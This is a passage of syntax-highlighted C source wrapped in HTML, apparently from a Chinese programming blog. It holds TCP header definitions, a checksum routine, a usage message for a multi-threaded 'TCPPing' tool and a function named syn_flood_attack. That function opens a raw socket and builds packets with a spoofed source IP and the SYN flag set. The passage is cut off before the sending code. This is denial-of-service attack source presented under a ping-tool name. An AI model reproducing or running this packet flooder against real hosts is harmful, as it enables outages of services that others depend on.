style="COLOR: #008000">4位首部长度/6位保留字 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">char</span><span style="COLOR: #000000"> th_flag; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">6位标志位 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    USHORT th_win; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">16位窗口大小 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    USHORT th_sum; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">16位校验和 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    USHORT th_urp; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">16位紧急数据偏移量 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/0196c3df5ea9e936f21e9932cca91014.gif"/></span><span style="COLOR: #000000">}</span></span>
<span style="COLOR: #000000">TCPHEADER; <br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #0000ff">#pragma</span>
<span style="COLOR: #000000"> pack(pop)</span>
<span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">CheckSum:计算校验和的子函数 </span>
<span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #000000">USHORT checksum(USHORT </span>
<span style="COLOR: #000000">*</span>
<span style="COLOR: #000000">buffer, </span>
<span style="COLOR: #0000ff">int</span>
<span style="COLOR: #000000"> size) <br/><img align="top" alt="" id="_2469_2715_Open_Image" src="images/ez/a41954a27d6ad96fa2c2cf816e677448.gif"/><img align="top" alt="" id="_2469_2715_Closed_Image" src="images/ez/1327ab569c1ae82736693a50b8e33378.gif" style="DISPLAY: none"/></span>
<span id="_2469_2715_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span>
<span id="_2469_2715_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    unsigned </span><span style="COLOR: #0000ff">long</span><span style="COLOR: #000000"> cksum</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">while</span><span style="COLOR: #000000">(size </span><span style="COLOR: #000000">&gt;</span><span style="COLOR: #000000">1</span><span style="COLOR: #000000">) <br/><img align="top" alt="" id="_2515_2566_Open_Image" src="images/ez/37c8bf68cdc3cc81759c34160776bc53.gif"/><img align="top" alt="" id="_2515_2566_Closed_Image" src="images/ez/7ff8d92cded7e0ce15e7ca1acc870052.gif" style="DISPLAY: none"/>    </span><span id="_2515_2566_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span><span id="_2515_2566_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        cksum</span><span style="COLOR: #000000">+=*</span><span style="COLOR: #000000">buffer</span><span style="COLOR: #000000">++</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        size </span><span style="COLOR: #000000">-=</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(USHORT); <br/><img align="top" alt="" src="images/ez/717446ca04a6125dc5b6b54e0fa14ab4.gif"/>    }</span></span><span style="COLOR: #000000"> <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">if</span><span style="COLOR: #000000">(size ) <br/><img align="top" alt="" id="_2582_2615_Open_Image" src="images/ez/37c8bf68cdc3cc81759c34160776bc53.gif"/><img align="top" alt="" id="_2582_2615_Closed_Image" src="images/ez/7ff8d92cded7e0ce15e7ca1acc870052.gif" style="DISPLAY: none"/>    </span><span id="_2582_2615_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span><span id="_2582_2615_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        cksum </span><span style="COLOR: #000000">+=</span><span style="COLOR: #000000"> </span><span style="COLOR: #000000">*</span><span style="COLOR: #000000">(UCHAR</span><span style="COLOR: #000000">*</span><span style="COLOR: #000000">)buffer; <br/><img align="top" alt="" src="images/ez/717446ca04a6125dc5b6b54e0fa14ab4.gif"/>    }</span></span><span style="COLOR: #000000"> <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    cksum </span><span style="COLOR: #000000">=</span><span style="COLOR: #000000"> (cksum </span><span style="COLOR: #000000">&gt;&gt;</span><span style="COLOR: #000000"> </span><span style="COLOR: #000000">16</span><span style="COLOR: #000000">) </span><span style="COLOR: #000000">+</span><span style="COLOR: #000000"> (cksum </span><span style="COLOR: #000000">&amp;</span><span style="COLOR: #000000"> </span><span style="COLOR: #000000">0xffff</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    cksum </span><span style="COLOR: #000000">+=</span><span style="COLOR: #000000"> (cksum </span><span style="COLOR: #000000">&gt;&gt;</span><span style="COLOR: #000000">16</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">return</span><span style="COLOR: #000000"> (USHORT)(</span><span style="COLOR: #000000">~</span><span style="COLOR: #000000">cksum); <br/><img align="top" alt="" src="images/ez/0196c3df5ea9e936f21e9932cca91014.gif"/>}</span></span>
<span style="COLOR: #000000"> <br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #0000ff">void</span>
<span style="COLOR: #000000"> useage() <br/><img align="top" alt="" id="_2734_2976_Open_Image" src="images/ez/a41954a27d6ad96fa2c2cf816e677448.gif"/><img align="top" alt="" id="_2734_2976_Closed_Image" src="images/ez/1327ab569c1ae82736693a50b8e33378.gif" style="DISPLAY: none"/></span>
<span id="_2734_2976_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span>
<span id="_2734_2976_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    printf(</span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">****************************************** </span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    printf(</span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">TCPPing </span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    printf(</span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">Useage: TCPPing.exe Target_ip Target_port Source_ip source_port sendcount threadnum </span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    printf(</span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">******************************************* </span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/0196c3df5ea9e936f21e9932cca91014.gif"/>}</span></span>
<span style="COLOR: #000000"> <br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #0000ff">int</span>
<span style="COLOR: #000000"> syn_flood_attack(</span>
<span style="COLOR: #0000ff">const</span>
<span style="COLOR: #000000"> </span>
<span style="COLOR: #0000ff">char</span>
<span style="COLOR: #000000">*</span>
<span style="COLOR: #000000"> destip, </span>
<span style="COLOR: #0000ff">int</span>
<span style="COLOR: #000000"> destport, </span>
<span style="COLOR: #0000ff">const</span>
<span style="COLOR: #000000"> </span>
<span style="COLOR: #0000ff">char</span>
<span style="COLOR: #000000"> </span>
<span style="COLOR: #000000">*</span>
<span style="COLOR: #000000"> srcip, </span>
<span style="COLOR: #0000ff">int</span>
<span style="COLOR: #000000"> srcport)<br/><img align="top" alt="" id="_3069_5743_Open_Image" src="images/ez/a41954a27d6ad96fa2c2cf816e677448.gif"/><img align="top" alt="" id="_3069_5743_Closed_Image" src="images/ez/1327ab569c1ae82736693a50b8e33378.gif" style="DISPLAY: none"/></span>
<span id="_3069_5743_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span>
<span id="_3069_5743_Open_Text"><span style="COLOR: #000000">{<!-- --><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    SOCKET sock; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    SOCKADDR_IN addr_in; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    IPHEADER ipHeader; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    TCPHEADER tcpHeader; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    PSDHEADER psdHeader; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" id="_3197_3199_Open_Image" src="images/ez/37c8bf68cdc3cc81759c34160776bc53.gif"/><img align="top" alt="" id="_3197_3199_Closed_Image" src="images/ez/7ff8d92cded7e0ce15e7ca1acc870052.gif" style="DISPLAY: none"/>    </span><span style="COLOR: #0000ff">char</span><span style="COLOR: #000000"> szSendBuf[</span><span style="COLOR: #000000">60</span><span style="COLOR: #000000">]</span><span style="COLOR: #000000">=</span><span id="_3197_3199_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span><span id="_3197_3199_Open_Text"><span style="COLOR: #000000">{<!-- --></span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">}</span></span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    BOOL flag; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">int</span><span style="COLOR: #000000"> rect,nTimeOver; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">if</span><span style="COLOR: #000000"> ((sock</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">,WSA_FLAG_OVERLAPPED))</span><span style="COLOR: #000000">==</span><span style="COLOR: #000000">INVALID_SOCKET) <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))==INVALID_SOCKET)</span><span style="COLOR: #008000"><br/><img align="top" alt="" id="_3403_3460_Open_Image" src="images/ez/37c8bf68cdc3cc81759c34160776bc53.gif"/><img align="top" alt="" id="_3403_3460_Closed_Image" src="images/ez/7ff8d92cded7e0ce15e7ca1acc870052.gif" style="DISPLAY: none"/></span><span style="COLOR: #000000">    </span><span id="_3403_3460_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span><span id="_3403_3460_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        printf(</span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">Socket Setup Error! </span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        </span><span style="COLOR: #0000ff">return</span><span style="COLOR: #000000"> </span><span style="COLOR: #0000ff">false</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/717446ca04a6125dc5b6b54e0fa14ab4.gif"/>    }</span></span><span style="COLOR: #000000"> <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    flag</span><span style="COLOR: #000000">=</span><span style="COLOR: #0000ff">true</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">if</span><span style="COLOR: #000000"> (setsockopt(sock,IPPROTO_IP, IP_HDRINCL,(</span><span style="COLOR: #0000ff">char</span><span style="COLOR: #000000"> </span><span style="COLOR: #000000">*</span><span style="COLOR: #000000">)</span><span style="COLOR: #000000">&amp;</span><span style="COLOR: #000000">flag,</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(flag))</span><span style="COLOR: #000000">==</span><span style="COLOR: #000000">SOCKET_ERROR) <br/><img align="top" alt="" id="_3565_3631_Open_Image" src="images/ez/37c8bf68cdc3cc81759c34160776bc53.gif"/><img align="top" alt="" id="_3565_3631_Closed_Image" src="images/ez/7ff8d92cded7e0ce15e7ca1acc870052.gif" style="DISPLAY: none"/>    </span><span id="_3565_3631_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span><span id="_3565_3631_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        printf(</span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">setsockopt IP_HDRINCL error! </span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        </span><span style="COLOR: #0000ff">return</span><span style="COLOR: #000000"> </span><span style="COLOR: #0000ff">false</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/717446ca04a6125dc5b6b54e0fa14ab4.gif"/>    }</span></span><span style="COLOR: #000000"> <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    nTimeOver</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">1000</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">if</span><span style="COLOR: #000000"> (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (</span><span style="COLOR: #0000ff">char</span><span style="COLOR: #000000">*</span><span style="COLOR: #000000">)</span><span style="COLOR: #000000">&amp;</span><span style="COLOR: #000000">nTimeOver, </span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(nTimeOver))</span><span style="COLOR: #000000">==</span><span style="COLOR: #000000">SOCKET_ERROR) <br/><img align="top" alt="" id="_3755_3822_Open_Image" src="images/ez/37c8bf68cdc3cc81759c34160776bc53.gif"/><img align="top" alt="" id="_3755_3822_Closed_Image" src="images/ez/7ff8d92cded7e0ce15e7ca1acc870052.gif" style="DISPLAY: none"/>    </span><span id="_3755_3822_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span><span id="_3755_3822_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        printf(</span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">setsockopt SO_SNDTIMEO error! </span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        </span><span style="COLOR: #0000ff">return</span><span style="COLOR: #000000"> </span><span style="COLOR: #0000ff">false</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/717446ca04a6125dc5b6b54e0fa14ab4.gif"/>    }</span></span><span style="COLOR: #000000"> <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    addr_in.sin_family</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">AF_INET; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    addr_in.sin_port</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">htons(destport);  </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">目标端口</span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    addr_in.sin_addr.S_un.S_addr</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">inet_addr(destip); </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">目标IP<br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000"> <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">填充IP首部 <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #008000">//<br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    ipHeader.h_verlen</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">(</span><span style="COLOR: #000000">4</span><span style="COLOR: #000000">&lt;&lt;</span><span style="COLOR: #000000">4</span><span style="COLOR: #000000"> </span><span style="COLOR: #000000">|</span><span style="COLOR: #000000"> </span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(ipHeader)</span><span style="COLOR: #000000">/</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(unsigned </span><span style="COLOR: #0000ff">long</span><span style="COLOR: #000000">)); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000"> ipHeader.tos=0; </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    ipHeader.total_len</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">htons(</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(ipHeader)</span><span style="COLOR: #000000">+</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(tcpHeader)); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    ipHeader.ident</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">1</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    ipHeader.frag_and_flags</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    ipHeader.ttl</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">128</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    ipHeader.proto</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">IPPROTO_TCP; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    ipHeader.checksum</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    ipHeader.sourceIP</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">inet_addr(srcip); </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">src ip</span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    ipHeader.destIP</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">inet_addr(destip); </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">dest ip<br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">填充TCP首部 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    tcpHeader.th_dport</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">htons(destport);  </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">目标端口</span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    tcpHeader.th_sport</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">htons(srcport); </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">源端口号 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    tcpHeader.th_seq</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">htonl(</span><span style="COLOR: #000000">0x12345678</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    tcpHeader.th_ack</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    tcpHeader.th_lenres</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">(</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(tcpHeader)</span><span style="COLOR: #000000">/</span><span style="COLOR: #000000">4</span><span style="COLOR: #000000">&lt;&lt;</span><span style="COLOR: #000000">4</span><span style="COLOR: #000000">|</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    tcpHeader.th_flag</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">2</span><span style="COLOR: #000000">; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">修改这里来实现不同的标志位探测，2是SYN，1是FIN，16是ACK探测 等等 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    tcpHeader.th_win</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">htons(</span><span style="COLOR: #000000">512</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    tcpHeader.th_urp</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    tcpHeader.th_sum</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    psdHeader.saddr</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">ipHeader.sourceIP; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    psdHeader.daddr</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">ipHeader.destIP; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    psdHeader.mbz</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    psdHeader.ptcl</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">IPPROTO_TCP; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    psdHeader.tcpl</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">htons(</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(tcpHeader)); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">计算校验和 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    memcpy(szSendBuf, </span><span style="COLOR: #000000">&amp;</span><span style="COLOR: #000000">psdHeader, </span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(psdHeader)); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    memcpy(szSendBuf</span><span style="COLOR: #000000">+</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(psdHeader), </span><span style="COLOR: #000000">&amp;</span><span style="COLOR: #000000">tcpHeader, </span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(tcpHeader)); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    tcpHeader.th_sum</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">checksum((USHORT </span><span style="COLOR: #000000">*</span><span style="COLOR: #000000">)szSendBuf,</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(psdHeader)</span><span style="COLOR: #000000">+</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(tcpHeader)); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    memcpy(szSendBuf, </span><span style="COLOR: #000000">&amp;</span><span style="COLOR: #000000">ipHeader, </span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(ipHeader)); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    memcpy(szSendBuf</span><span style="COLOR: #000000">+</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(ipHeader), </span><span style="COLOR: #000000">&amp;</span><span style="COLOR: #000000">tcpHeader, </span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(tcpHeader)); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    memset(szSendBuf</span><span style="COLOR: #000000">+</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(ipHeader)</span><span style="COLOR: #000000">+</span><span 